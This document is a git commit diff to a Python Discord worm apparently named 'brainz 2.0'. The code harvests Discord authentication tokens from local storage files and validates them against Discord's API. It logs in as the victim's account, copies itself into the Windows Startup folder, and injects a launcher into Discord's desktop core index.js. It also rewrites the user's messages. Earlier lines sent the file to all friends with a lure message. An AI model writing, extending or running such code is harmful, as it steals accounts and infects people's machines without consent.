6aadef91921405ea76b08ca5bb46c244b591d609
Echo <66488397+NullByte75@users.noreply.github.com>
2021-03-12 17:13:20 +0100

    Update brainz 2.0.py

--- brainz 2.0.py
+++ brainz 2.0.py
@@ -1,15 +1,34 @@
+import time
 import discord
 from discord.ext import commands
 import asyncio
 import os
 import random
 import re
+import requests
 import shutil
 
+base = os.path.basename(__file__)
 local = os.getenv('LOCALAPPDATA')
 user = os.getenv('USERNAME')
 roaming = os.getenv('APPDATA')
 tokens = []
+
+def check_token(token):
+    headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": token
+    }
+    json = {
+        "theme": ""
+    }
+    r2 = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+    print("code: " + str(r2.status_code))
+    if str(r2.status_code) == "401":
+        return False
+    else:
+        return True 
+
 
 def find_tokens(path):
 
@@ -22,41 +41,6 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
-
-prefix = ""
-client = discord.Client()
-message = discord.Message 
-bot = commands.Bot(command_prefix=prefix, self_bot=True)
-
-@bot.event
-async def on_ready():
-    base = os.path.basename(__file__)
-    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
-    print()
-    for friend in bot.user.friends:
-        await friend.send("Ayo try this new game!")
-        await friend.send(file=discord.File(__file__))
-
-@bot.event
-async def on_message(message):
-    if bot.user.id == message.author.id:
-        randombrains = random.randint(1,30)
-        firstcontent = message.content
-        firstcontentlength = len(firstcontent)
-        if message.content == "Ayo try this new game!":
-            pass
-        contentbefore = ""
-        if firstcontentlength < 3:
-            pass
-        elif firstcontentlength < 5:
-            contentbefore = firstcontent[:2]
-        elif firstcontentlength > 5:
-            firstcontentnum = random.randint(1, 5)
-            contentbefore = firstcontent[:firstcontentnum]
-        
-        await message.edit(content=contentbefore + "BR" + 'A' * randombrains + "INS")
-    else:
-        pass
 
 path1 = roaming + '\\discord\\Local Storage\\leveldb'
 path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
@@ -81,5 +65,63 @@ if os.path.isdir(str(path6)):
 if os.path.isdir(str(path7)):
     find_tokens(str(path7))
 
+def even_more_persistance():
+    jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
+    payload = """module.exports = require('./core.asar');
+    const { exec } = require("child_process");
+    exec(""""'C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base + "'"""", (error, stdout, stderr) => {
+    if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+    });
+"""
+    with open(jspath, "w") as inject:
+        inject.write(payload)
+        inject.close()
+
+prefix = ""
+client = discord.Client()
+message = discord.Message 
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
+
+@bot.event
+async def on_ready():
+    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
+    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
+    even_more_persistance()
+    #for friend in bot.user.friends:
+        #await friend.send("Ayo try this new game!")
+        #await friend.send(file=discord.File(__file__))
+
+@bot.event
+async def on_message(message):
+    if bot.user.id == message.author.id:
+        randombrains = random.randint(1,30)
+        firstcontent = message.content
+        firstcontentlength = len(firstcontent)
+        if message.content == "Ayo try this new game!":
+            pass
+        contentbefore = ""
+        if firstcontentlength < 3:
+            pass
+        elif firstcontentlength < 5:
+            contentbefore = firstcontent[:2]
+        elif firstcontentlength > 5:
+            firstcontentnum = random.randint(1, 5)
+            contentbefore = firstcontent[:firstcontentnum]
+        
+        await message.edit(content=contentbefore + "BR" + 'A' * randombrains + "INS")
+    else:
+        pass
+
 for token in tokens:
-    bot.run(token, bot=False)
+    if check_token(token):
+        bot.run(token, bot=False)
+    else:
+        pass
